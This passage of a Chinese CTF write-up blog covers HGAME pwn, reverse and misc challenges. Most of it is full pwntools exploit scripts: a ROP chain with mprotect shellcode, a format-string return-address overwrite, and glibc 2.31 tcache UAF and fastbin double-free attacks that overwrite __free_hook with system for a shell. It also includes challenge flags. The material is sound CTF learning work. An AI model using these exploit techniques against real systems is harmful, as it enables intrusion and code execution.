class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;139.196.183.57&quot;, 32447)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/yech0/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x00000000004013e3</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40125b</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;accord.\n&#x27;</span>)<br><br>off = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>)<br>payload = off <br>payload += p64(pop_rdi_ret) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>io.send(payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># base = puts_addr - (0x7fd0c0aa1420-0x7fd0c0a1d000)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base&#x27;</span>+<span class="hljs-built_in">hex</span>(base))<br>mprotect = base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>rdi = base + <span class="hljs-number">0x0000000000023b6a</span><br>rsi = base + <span class="hljs-number">0x000000000002601f</span><br>rdx = base + <span class="hljs-number">0x0000000000142c92</span><br>rax = base + <span class="hljs-number">0x0000000000036174</span>   <span class="hljs-comment"># 返回值</span><br>rsp = base + <span class="hljs-number">0x000000000002f70a</span><br>addr = <span class="hljs-number">0x404500</span><br>readtst = <span class="hljs-number">0x401276</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr) + p64(readtst)<br>io.send(payload2)<br>payload4 = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x100</span>) + p64(addr+<span class="hljs-number">0x100</span>) + p64(readtst)<br>io.send(payload4)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>payload3 = p64(<span class="hljs-number">0</span>) + p64(rdi) + p64(<span class="hljs-number">0x404000</span>)<br>payload3 += p64(rsi) + p64(<span class="hljs-number">0x1000</span>)<br>payload3 += p64(rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload3 += p64(rdi) + p64(<span class="hljs-number">0</span>)<br>payload3 += p64(rsi) + p64(addr) <br>payload3 += p64(rdx) + p64(<span class="hljs-number">0x50</span>) + p64(read)<br>payload3 += p64(addr)<br>io.send(payload3)<br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, addr, <span class="hljs-number">0x50</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, addr, <span class="hljs-number">0x50</span>)<br>io.send(asm(shellcode))<br><br>io.interactive()<br></code></pre></td></tr></table></figure></li><li><p>又看到一个师傅的wp能leak出栈地址：即libc的<code>__environ</code>能leak出栈地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = base + libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>] <br>p = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(pop_rdi_ret) + p64(environ) + p64(puts_plt) + p64(main) <br>io.sendafter(<span class="hljs-string">b&#x27;you an accord.\n&#x27;</span>, p)<br>stack = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1e8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stack&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<span class="hljs-comment"># 写p的起始位置</span><br>gdb.attach(io)<br>pause()<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="4-fmt"><a href="#4-fmt" class="headerlink" title="4 fmt"></a>4 fmt</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fini_arry不能改(Partial RELRO)</span><br><span class="hljs-comment"># 也没有栈溢出 不能chk_fail</span><br><span class="hljs-comment"># 也没有exit(即在printf之后调用的函数)</span><br><span class="hljs-comment"># 只能改返回地址</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># io = remote(&#x27;139.196.183.57&#x27;, 32338)</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>backdoor = <span class="hljs-number">0x40123d</span><br>main = <span class="hljs-number">0x401331</span><br>vuln = <span class="hljs-number">0x401254</span><br>printf_got = <span class="hljs-number">0x404040</span><br><span class="hljs-comment"># 需要改的是给出地址中的内容 也就是说需要给出内容是main（返回地址）的栈地址</span><br><br><span class="hljs-comment"># 10</span><br><span class="hljs-comment"># 19/22/21</span><br><span class="hljs-comment"># io.recv()</span><br>sleep(<span class="hljs-number">0.5</span>)<br>gdb.attach(io)<br><span class="hljs-comment"># pause()</span><br>payload = <span class="hljs-string">b&#x27;%72c%18$hhnaaaaa&#x27;</span>+p64(backdoor)*<span class="hljs-number">6</span><br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><ul><li><p>这个是晨曦师傅的wp <del>mad官方也没发这题的wp</del><br>将offset为18的位置的二级指针修改 让返回地址为sys(中的一个就欧克)</p><blockquote><p><strong>其实格式化字符串修改的都是二级指针</strong> 只是之前我们修改的是指定地址的<br>如strfmt_payload(10, {printf_got : system})<br>    在函数栈中的结构为：栈地址 –&gt; got表地址（0x404040）–&gt; printf的真实地址（0x7f…）<br>    修改的就是printf的真实地址 也是二级指针</p></blockquote></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 40</span><br>00:0000│ rsp 0x7ffc0dbb3f20 ◂— &#x27;make strings and getshell\n&#x27;<br>01:0008│     0x7ffc0dbb3f28 ◂— &#x27;ings and getshell\n&#x27;<br>02:0010│     0x7ffc0dbb3f30 ◂— &#x27; getshell\n&#x27;<br>03:0018│     0x7ffc0dbb3f38 ◂— 0xa6c /* &#x27;l\n&#x27; */<br>04:0020│ rdi 0x7ffc0dbb3f40 ◂— 0x2438312563323725 (&#x27;%72c%18$&#x27;)<br>05:0028│     0x7ffc0dbb3f48 ◂— 0x61616161616e6868 (&#x27;hhnaaaaa&#x27;)<br>06:0030│     0x7ffc0dbb3f50 —▸ 0x40123d (sys) ◂— endbr64 <br>... ↓        5 skipped<br>0c:0060│     0x7ffc0dbb3f80 —▸ 0x7ffc0dbb3fa0 —▸ 0x7ffc0dbb3fc0 ◂— 0x1# offset=18<br>0d:0068│     0x7ffc0dbb3f88 —▸ 0x7ffc0dbb40d8 —▸ 0x7ffc0dbb63ac ◂— 0x53006e6c75762f2e /* &#x27;./vuln&#x27; */<br>0e:0070│     0x7ffc0dbb3f90 ◂— 0x0<br>0f:0078│     0x7ffc0dbb3f98 ◂— 0x697d0efaef5a6200<br>10:0080│ rbp 0x7ffc0dbb3fa0 —▸ 0x7ffc0dbb3fc0 ◂— 0x1<br>11:0088│     0x7ffc0dbb3fa8 —▸ 0x401369 (main+60) ◂— mov eax, 0<br>12:0090│     0x7ffc0dbb3fb0 ◂— 0x0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">tele 0x7ffc0dbb3f20 40</span><br>00:0000│     0x7ffc0dbb3f20 ◂— &#x27;make strings and getshell\n&#x27;<br>01:0008│     0x7ffc0dbb3f28 ◂— &#x27;ings and getshell\n&#x27;<br>02:0010│     0x7ffc0dbb3f30 ◂— &#x27; getshell\n&#x27;<br>03:0018│     0x7ffc0dbb3f38 ◂— 0xa6c /* &#x27;l\n&#x27; */<br>04:0020│     0x7ffc0dbb3f40 ◂— 0x2438312563323725 (&#x27;%72c%18$&#x27;)# offset=10<br>05:0028│ rbp 0x7ffc0dbb3f48 ◂— 0x61616161616e6868 (&#x27;hhnaaaaa&#x27;)<br>06:0030│     0x7ffc0dbb3f50 —▸ 0x40123d (sys) ◂— endbr64 <br>... ↓        5 skipped<br>0c:0060│     0x7ffc0dbb3f80 —▸ 0x7ffc0dbb3fa0 —▸ 0x7ffc0dbb3f48 ◂— 0x61616161616e6868 (&#x27;hhnaaaaa&#x27;)# 18<br>0d:0068│     0x7ffc0dbb3f88 —▸ 0x7ffc0dbb40d8 —▸ 0x7ffc0dbb63ac ◂— 0x53006e6c75762f2e /* &#x27;./vuln&#x27; */<br></code></pre></td></tr></table></figure><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h4><ul><li>直接ida打开附件就能看到flag</li></ul><h4 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h4><ul><li><p>好好好 gpt这么不靠谱 异或0x22算不对<br>多用用python计算把 </p></li><li><blockquote><pre><code class="python">a = [74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34]for i in a:   print(chr(i^0x22), end=&#39;&#39;)<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>* ```<br> hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;<br></code></pre></td></tr></table></figure></code></pre></blockquote></li></ul><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><ul><li>公众号</li></ul><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><ul><li><p>图片 也提示了换一种视角 </p></li><li><blockquote><p><a href="https://lab.magiconch.com/xzk/">https://lab.magiconch.com/xzk/</a></p><p>斜着看⽣成器 - 神奇海螺⽣成器</p><ul><li>将图片压扁就能看出来的</li></ul></blockquote></li><li><p>用ps图像-&gt;图像大小-&gt;把高度减小就行</p></li><li><pre><code class="hljs">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</code></pre></li></ul><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h3><h4 id="Elden-Ring-Ⅱ"><a href="#Elden-Ring-Ⅱ" class="headerlink" title="Elden Ring Ⅱ"></a>Elden Ring Ⅱ</h4><ul><li><blockquote><p><a href="https://www.anquanke.com/post/id/241316">https://www.anquanke.com/post/id/241316</a></p></blockquote>直接对着这个文章  没怎么调就出了 对大师傅们来说就板子题 白给的 但我还是差不多是第一次做2.31的<br>(而且libc也没出什么问题 有点子丝滑的)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 2.31 cache uaf 改got表</span><br><span class="hljs-comment"># 突然发现这个没改got表 也是打hook的(2.31还是可以打free_hook的</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">32225</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">indx, content</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>add(i, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>delete(i)<br>delete(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>unsorted = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = unsorted - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><br>edit(<span class="hljs-number">6</span>, p64(free_hook))<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">10</span>, p64(system))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">11</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hgame</span><span class="hljs-template-variable">&#123;efe01dae79f12a6a269998df72444988fbd2b642&#125;</span><br></code></pre></td></tr></table></figure><h4 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h4><ul><li><p>2.31_9.14 全绿 size有问题 但没看出来怎么绕过</p></li><li><p><del>好好好 晨曦师傅真的6 直接找2023的hgame 题基本都一样</del></p></li><li><p>我去 牛的 这里指针没有清零的 但是我没看出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id; <span class="hljs-comment">// [rsp+Ch] [rbp-14h] BYREF</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;id);<br>  <span class="hljs-keyword">if</span> ( id &gt; <span class="hljs-number">0xF</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    ptr = (&amp;notes)[id];<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">free</span>(ptr);<br>      ptr = <span class="hljs-number">0LL</span>;<span class="hljs-comment">// 这里其实没有把指针清零啊 清的只是ptr (&amp;notes)[id]处还存在指针的 所以uaf</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No such note.&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>和上一个题差不多 但没有edit</p></li><li><blockquote><p>官方wp:</p><p>2.31的double free 这个版本的tcache中有针对double free的检查，但fastbin中没有相关检查，因此</p><p>可以先填满tcache，然后在fastbin中构造double free</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 2.31-9.14 cache 全绿</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;139.196.183.57&quot;</span>, <span class="hljs-number">32202</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size, content</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>io.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>add(i, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;unsorted&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>delete(i)<br>delete(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>unsorted = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = unsorted - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">8</span>):<br>add(i, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;fastbin&#x27;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;fastbin&#x27;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protect&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">8</span>):<br>delete(i)<br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;tcache&#x27;</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x30</span>,p64(free_hook))<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x30</span>, <span 